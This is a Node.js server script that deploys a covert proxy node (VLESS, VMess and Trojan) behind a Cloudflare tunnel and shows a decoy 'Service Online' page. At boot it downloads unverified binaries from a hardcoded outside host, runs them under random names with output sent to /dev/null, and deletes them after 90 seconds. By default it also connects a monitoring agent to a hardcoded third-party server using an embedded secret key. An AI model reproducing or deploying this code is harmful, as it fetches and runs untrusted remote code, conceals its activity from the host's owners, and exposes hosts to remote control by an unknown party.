const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// ========== 1. Core Config (Argo variables MUST stay) ==========
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || './tmp';
const API_ROUTE = process.env.SUB_PATH || 'qianxiuadmin';   // 原 SUB_PATH
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const UUID = process.env.UUID || 'dc6f1e49-59fe-424b-8821-c61ebff31d0d';
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'jk.zenova.de5.net:8008';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || 'nfZkxIKilkI9lMpFvAD46F8HdA3ci12f';

// Cloudflare Argo (do not rename)
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH   = process.env.ARGO_AUTH || '';
const ARGO_PORT   = process.env.ARGO_PORT || 8010;
const CFIP        = process.env.CFIP || 'cdns.doon.eu.org';
const CFPORT      = process.env.CFPORT || 443;

const NAME = process.env.NAME || 'MyNode';

// cache
let cacheData = "";

// ========== 2. HTML ==========
const NAV_HTML = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>My Navigation</title>
</head>
<body>
<h2>Service Online</h2>
</body>
</html>
`;

// ========== 3. Runtime Paths ==========
if (!fs.existsSync(FILE_PATH)) fs.mkdirSync(FILE_PATH);

function randName() {
  const c = 'abcdefghijklmnopqrstuvwxyz';
  let r = '';
  for (let i = 0; i < 6; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

const binA = path.join(FILE_PATH, randName());
const binB = path.join(FILE_PATH, randName());
const binC = path.join(FILE_PATH, randName());
const binD = path.join(FILE_PATH, randName());

const logFile  = path.join(FILE_PATH, 'boot.log');
const cfgFile  = path.join(FILE_PATH, 'config.json');
const dataFile = path.join(FILE_PATH, 'data.txt');

// ========== 4. Routes ==========
app.get("/", (req, res) => res.send(NAV_HTML));

app.get("/" + API_ROUTE, (req, res) => {
  res.set('Content-Type', 'text/plain; charset=utf-8');
  if (!cacheData) {
    return res.send(Buffer.from("Service Starting, please wait...").toString('base64'));
  }
  res.send(cacheData);
});

// ========== 5. Core ==========
async function buildCfg() {
  const cfg = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      {
        port: ARGO_PORT,
        protocol: 'vless',
        settings: {
          clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
          decryption: 'none',
          fallbacks: [
            { dest: 3001 },
            { path: "/vless-argo", dest: 3002 },
            { path: "/vmess-argo", dest: 3003 },
            { path: "/trojan-argo", dest: 3004 }
          ]
        },
        streamSettings: { network: 'tcp' }
      },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" },
        streamSettings: { network: "ws", wsSettings: { path: "/vless-argo" } } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] },
        streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] },
        streamSettings: { network: "ws", wsSettings: { path: "/trojan-argo" } } }
    ],
    outbounds: [{ protocol: "freedom", tag: "direct" }]
  };
  fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2));
}

async function stageRuntime() {
  const arch = (os.arch() === 'arm64' || os.arch() === 'aarch64') ? 'arm' : 'amd';
  const base = arch === 'arm' ? "https://arm64.ssss.nyc.mn" : "https://amd64.ssss.nyc.mn";

  const bins = [
    { name: binA, url: `${base}/web` },
    { name: binB, url: `${base}/bot` }
  ];

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) bins.push({ name: binC, url: `${base}/agent` });
    else bins.push({ name: binD, url: `${base}/v1` });
  }

  for (const f of bins) {
    const r = await axios({ method: 'get', url: f.url, responseType: 'stream' });
    const w = fs.createWriteStream(f.name);
    r.data.pipe(w);
    await new Promise(ok => w.on('finish', ok));
    fs.chmodSync(f.name, 0o775);
  }

  // Nezha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const tls = ['443', '8443', '2096'].includes(NEZHA_SERVER.split(':').pop()) ? 'true' : 'false';
      const yml = `client_secret: ${NEZHA_KEY}
server: ${NEZHA_SERVER}
tls: ${tls}
uuid: ${UUID}
disable_auto_update: true`;
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), yml);
      exec(`nohup ${binD} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`);
    } else {
      const tlsFlag = ['443','8443','2096'].includes(NEZHA_PORT) ? '--tls' : '';
      exec(`nohup ${binC} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsFlag} >/dev/null 2>&1 &`);
    }
  }

  exec(`nohup ${binA} -c ${cfgFile} >/dev/null 2>&1 &`);

  let argoArgs = ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)
    ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`
    : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;

  exec(`nohup ${binB} ${argoArgs} >/dev/null 2>&1 &`);
}

async function waitEndpoint() {
  const timer = setInterval(() => {
    if (fs.existsSync(logFile)) {
      const txt = fs.readFileSync(logFile, 'utf8');
      const m = txt.match(/https?:\/\/([^ ]*trycloudflare\.com)/);
      if (m) {
        clearInterval(timer);
        buildOutput(m[1]);
      }
    } else if (ARGO_DOMAIN && ARGO_AUTH) {
      clearInterval(timer);
      buildOutput(ARGO_DOMAIN);
    }
  }, 3000);
}

function buildOutput(host) {
  const tag = NAME || "Cloudflare";
  const vmess = {
    v: '2', ps: tag, add: CFIP, port: CFPORT,
    id: UUID, aid: '0', scy: 'none',
    net: 'ws', type: 'none',
    host: host, path: '/vmess-argo?ed=2560',
    tls: 'tls', sni: host, fp: 'firefox'
  };

  const payload = `vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${host}&fp=firefox&type=ws&host=${host}&path=%2Fvless-argo%3Fed%3D2560#${tag}
vmess://${Buffer.from(JSON.stringify(vmess)).toString('base64')}
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${host}&fp=firefox&type=ws&host=${host}&path=%2Ftrojan-argo%3Fed%3D2560#${tag}`;

  cacheData = Buffer.from(payload).toString('base64');
  fs.writeFileSync(dataFile, cacheData);
}

function recycleTmp() {
  setTimeout(() => {
    [logFile, cfgFile, binA, binB, binC, binD].forEach(f => {
      try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch(e){}
    });
  }, 90000);
}

async function boot() {
  await buildCfg();
  await stageRuntime();
  await waitEndpoint();
  recycleTmp();
}

boot().catch(console.error);
app.listen(PORT, () => console.log(`Server started on ${PORT}`));
